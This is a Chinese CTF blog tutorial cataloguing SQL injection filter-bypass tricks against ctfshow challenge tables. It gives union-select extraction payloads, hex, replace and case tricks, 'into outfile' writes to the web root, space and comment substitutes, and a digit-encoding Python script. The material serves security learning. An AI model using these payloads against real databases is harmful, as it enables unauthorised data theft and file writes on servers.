@@ -1,0 +1,352 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入 各种过滤的绕过姿势总结 | R1ck's Portal</title><meta name="author" content="R1ck Liu"><meta name="copyright" content="R1ck Liu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="回显过滤这一类的过滤从服务端传回客户端的响应内容 字段值过滤常量绕过（数字或字符串）如果对回显内容中不重要的字段的值过滤，可以将其替代为常量，此时回显中该字段的值为字段名的数字或字符串 例如如下payload，将username字段用常量1代替 1&#39; union select 1,password from ctfshow_user2 where username&#x3D;&#39;flag&amp;#3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入 各种过滤的绕过姿势总结">
+<meta property="og:url" content="https://rickliu.com/posts/4c025cd5aca8/index.html">
+<meta property="og:site_name" content="R1ck&#39;s Portal">
+<meta property="og:description" content="回显过滤这一类的过滤从服务端传回客户端的响应内容 字段值过滤常量绕过（数字或字符串）如果对回显内容中不重要的字段的值过滤，可以将其替代为常量，此时回显中该字段的值为字段名的数字或字符串 例如如下payload，将username字段用常量1代替 1&#39; union select 1,password from ctfshow_user2 where username&#x3D;&#39;flag&amp;#3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar.webp">
+<meta property="article:published_time" content="2024-04-26T13:58:02.000Z">
+<meta property="article:modified_time" content="2024-04-30T04:38:24.000Z">
+<meta property="article:author" content="R1ck Liu">
+<meta property="article:tag" content="note">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar.webp"><link rel="shortcut icon" href="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/favicon.png"><link rel="canonical" href="https://rickliu.com/posts/4c025cd5aca8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="CCDD774EA967D60E5C877121C6572BF5"/><meta name="baidu-site-verification" content="codeva-13aVmkscyC"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6c032eabab6689261ec86024f386af87";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: R1ck Liu","link":"链接: ","source":"来源: R1ck's Portal","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入 各种过滤的绕过姿势总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-30 12:38:24'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/equipment.css"><script type="text/javascript" src ="/js/reward.js" ></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book-open"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-user-group"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-suitcase"></i><span> 装备</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/background.png')"><nav id="nav"><span id="blog-info"><a href="/" title="R1ck's Portal"><span class="site-name">R1ck's Portal</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book-open"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-user-group"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-suitcase"></i><span> 装备</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入 各种过滤的绕过姿势总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-26T13:58:02.000Z" title="发表于 2024-04-26 21:58:02">2024-04-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-30T04:38:24.000Z" title="更新于 2024-04-30 12:38:24">2024-04-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Web/">CTF Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入 各种过滤的绕过姿势总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="回显过滤"><a href="#回显过滤" class="headerlink" title="回显过滤"></a>回显过滤</h2><p>这一类的过滤从服务端传回客户端的响应内容</p>
+<h3 id="字段值过滤"><a href="#字段值过滤" class="headerlink" title="字段值过滤"></a>字段值过滤</h3><h4 id="常量绕过（数字或字符串）"><a href="#常量绕过（数字或字符串）" class="headerlink" title="常量绕过（数字或字符串）"></a>常量绕过（数字或字符串）</h4><p>如果对回显内容中<strong>不重要的字段</strong>的值过滤，可以将其替代为常量，此时回显中该字段的值为字段名的数字或字符串</p>
+<p>例如如下payload，将username字段用常量1代替</p>
+<p><code>1&#39; union select 1,password from ctfshow_user2 where username=&#39;flag&#39;  -- qwe</code></p>
+<h4 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>如果是对回显内容中字段的值过滤，可以使用<strong>hex()</strong>将关键词转为十六进制数</p>
+<p>例如如下payload</p>
+<p><code>-1&#39; union select id,hex(username),password from ctfshow_user3 where username=&#39;flag&#39; -- qwe</code></p>
+<h4 id="replace绕过"><a href="#replace绕过" class="headerlink" title="replace绕过"></a>replace绕过</h4><p>replace绕过主要是应对对于回显结果的检测</p>
+<p>比如下面的检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
+<p>我们可以将被过滤的字符串替换为我们指定的字符串，然后将回显结果替换回去</p>
+<p>比如上述检测我们可以使用如下replace绕过</p>
+<p>首先<strong>用replace将回显中的数字替换</strong></p>
+<p><code>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;)</code></p>
+<p>得到回显结果后，将结果使用下面的python脚本复原</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher = <span class="string">&quot; &quot;</span></span><br><span class="line">flag = Cipher.replace(<span class="string">&quot;@A&quot;</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="string">&quot;@B&quot;</span>, <span class="string">&quot;2&quot;</span>).replace(<span class="string">&quot;@C&quot;</span>, <span class="string">&quot;3&quot;</span>).replace(<span class="string">&quot;@D&quot;</span>, <span class="string">&quot;4&quot;</span>).replace(<span class="string">&quot;@E&quot;</span>, <span class="string">&quot;5&quot;</span>).replace(<span class="string">&quot;@F&quot;</span>, <span class="string">&quot;6&quot;</span>).replace(<span class="string">&quot;@G&quot;</span>, <span class="string">&quot;7&quot;</span>).replace(<span class="string">&quot;@H&quot;</span>, <span class="string">&quot;8&quot;</span>).replace(<span class="string">&quot;@I&quot;</span>, <span class="string">&quot;9&quot;</span>).replace(<span class="string">&quot;@J&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+<h3 id="导出回显（针对全字符过滤）"><a href="#导出回显（针对全字符过滤）" class="headerlink" title="导出回显（针对全字符过滤）"></a>导出回显（针对全字符过滤）</h3><p>当回显中的所有ASCII字符均被过滤时，考虑将回显输出到网站根目录下的txt文件中</p>
+<p>例如如下情况：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时可以利用<strong>into</strong>语句</p>
+<p>payload为<code>-1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/ctf.txt&#39; -- qwe</code></p>
+<p>再访问<code>/ctf.txt</code>即可</p>
+<h2 id="传参-payload-过滤"><a href="#传参-payload-过滤" class="headerlink" title="传参(payload)过滤"></a>传参(payload)过滤</h2><h3 id="字段值过滤-1"><a href="#字段值过滤-1" class="headerlink" title="字段值过滤"></a>字段值过滤</h3><h4 id="16进制绕过-1"><a href="#16进制绕过-1" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>如果是对payload传参内容中目标字段值的过滤，可以将其用对应的十六进制值代替，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username = 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
+<p>当单双引号被禁用时，我们也可以将字段值用十六进制值来代替，这样值的位置就从字符串变为十六进制，避免使用引号</p>
+<h4 id="通配符绕过（模糊查询）"><a href="#通配符绕过（模糊查询）" class="headerlink" title="通配符绕过（模糊查询）"></a>通配符绕过（模糊查询）</h4><p>我们可以使用<strong>模糊查询like</strong>配合通配符来绕过对字段值的过滤</p>
+<p>比如flag被过滤，我们可以构造如下payload</p>
+<p><code>-1&#39;or(username)like&#39;f%</code></p>
+<p>或者<code>-1&#39;or(username)like&#39;%g</code></p>
+<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>常用于 <code>waf</code>的正则表达式对大小写不敏感的情况</p>
+<p>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
+<div class="note info flat"><p>在 SQL 中，<strong>关键字</strong>和<strong>函数名</strong>是不用区分字母大小写的，比如 SELECT、WHERE、ORDER、GROUP BY 等关键字，以及 ABS、MOD、ROUND、MAX 等函数名。</p>
+</div>
+<h4 id="改变编码"><a href="#改变编码" class="headerlink" title="改变编码"></a>改变编码</h4><p>通过hex、urlencode、url等编码替换关键字中的字符</p>
+<p>例如<code>or</code>可以替换为<code>%6fr</code></p>
+<h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><p>如果过滤器仅查找并移除单个实例的关键字，攻击者可以通过重复关键字来绕过过滤</p>
+<p>例如，如果过滤器设计为移除单个的 <code>SELECT</code>，攻击者可以在注入代码中使用 <code>SESELECTLECT</code></p>
+<p>在某些情况下，解析器在处理这类输入时会忽略中间的重叠部分，从而解析为有效的 <code>SELECT</code></p>
+<p>同样，<code>and</code>可以替换为<code>aandnd</code>，<code>or</code>可以替换为<code>oorr</code></p>
+<h4 id="使用相同功能的符号替换"><a href="#使用相同功能的符号替换" class="headerlink" title="使用相同功能的符号替换"></a>使用相同功能的符号替换</h4><p><code>and</code>关键字可以替换为<code>&amp;&amp;</code></p>
+<p><code>or</code>关键字可以替换为<code>||</code></p>
+<h4 id="舍弃关键字"><a href="#舍弃关键字" class="headerlink" title="舍弃关键字"></a>舍弃关键字</h4><p>如果关键字<code>select</code>被过滤，过滤时也不区分大小写，可以换一种思路来解题</p>
+<p>例如将拼接的payload作为原本sql语句的查询条件</p>
+<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><ol>
+<li><p>注释<strong>`/</strong>/`**</p>
+<div class="note info flat"><p>在MySQL中，用<code>/*注释*/</code>来标记注释的内容。</p>
+</div>
+<p>该绕过的原理是使用注释时会自动在语句中创建一个空格</p>
+</li>
+<li><p><strong>反引号</strong>（只能括表名和字段名）</p>
+<div class="note warning flat"><p>反引号只能替代<strong>字段名、表名</strong>前后的空格</p>
+</div>
+<p>例如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 替换前</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;Union Select id,username,password from ctfshow_user where username =&#x27;</span>flag<span class="string">&#x27; -- qwe</span></span><br><span class="line"><span class="string"># 替换后</span></span><br><span class="line"><span class="string">-1&#x27;</span><span class="keyword">Union</span><span class="comment">/**/</span><span class="keyword">Select</span>`id`,`username`,`password`<span class="keyword">from</span>`ctfshow_user`<span class="keyword">where</span>`username`<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>括号</strong>（仅能括能作为子查询的语句）</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;Union(Select(id),(username),(password)from(ctfshow_user)where(username)=&#x27;</span>flag<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>%09</strong></p>
+<p>可以使用水平制表符替换空格，tab的url编码为%09</p>
+</li>
+<li><p><strong>%0a</strong></p>
+<p>可以使用换行符替换空格，换行的url编码为%0a</p>
+</li>
+<li><p><strong>%0b</strong></p>
+<p>垂直制表符</p>
+</li>
+<li><p><strong>%0c</strong></p>
+<p>可以使用换页符替换空格，换页符的url编码为%0c</p>
+</li>
+<li><p><strong>%0d </strong></p>
+<p>可以使用回车符替换空格，回车的url编码为%0d</p>
+</li>
+<li><p><strong>%a0</strong></p>
+<p>可以使用不间断空格替换空格，不间断空格的url编码为%a0</p>
+</li>
+</ol>
+<h3 id="注释过滤"><a href="#注释过滤" class="headerlink" title="注释过滤"></a>注释过滤</h3><p>SQL注入题最常过滤的就是注释符，所以需要多备一些注释的方法，方便在被过滤时灵活切换</p>
+<p>常见注释如下：</p>
+<ol>
+<li><code>--空格</code></li>
+<li><code>--%0c</code></li>
+<li><code>#</code>或<code>%23</code></li>
+<li><code>/**/</code></li>
+<li><code>;%00</code></li>
+</ol>
+<p>当注释符都被过滤时，也可以考虑直接闭合后引号</p>
+<p>例如<code>and &#39;a&#39;=&#39;a</code></p>
+<h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><p>当payload语句中的<code>0-9</code>数字被过滤</p>
+<p>我们可以尝试使用布尔值<code>true</code>相加l来构造单个数字，通过concat来拼接多个数字</p>
+<p>例如<code>23</code>可以用<code>concat(true+true,true+true+true)</code></p>
+<p>下面是一个现成的替换脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    <span class="comment"># 去掉最后一个逗号，将其改为反括号</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure>
+<h3 id="where被过滤"><a href="#where被过滤" class="headerlink" title="where被过滤"></a>where被过滤</h3><p>当<code>where</code>关键字被过滤，且语句中未提供<code>where</code>关键字时，我们有两种绕过思路</p>
+<ol>
+<li><p>groupby+having替换where+like</p>
+<p>关键字<code>where + like</code>可以使用<code>group by + having</code>来替代</p>
+</li>
+<li><p>使用join或right join</p>
+<p>在SQL中，<code>JOIN</code> 语句用于结合两个或多个数据库表中的行。</p>
+<p>详细用法可以参考文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48083470/article/details/119043137">SQL注入 right/left join 详解与利用_sql注入right-CSDN博客</a></p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rickliu.com">R1ck Liu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rickliu.com/posts/4c025cd5aca8/">https://rickliu.com/posts/4c025cd5aca8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://rickliu.com" target="_blank">R1ck's Portal</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/note/">note</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/avatar.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/7ad0c78ef3a6/" title="sqlmap工具深入浅出"><img class="cover" src="/posts/7ad0c78ef3a6/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div 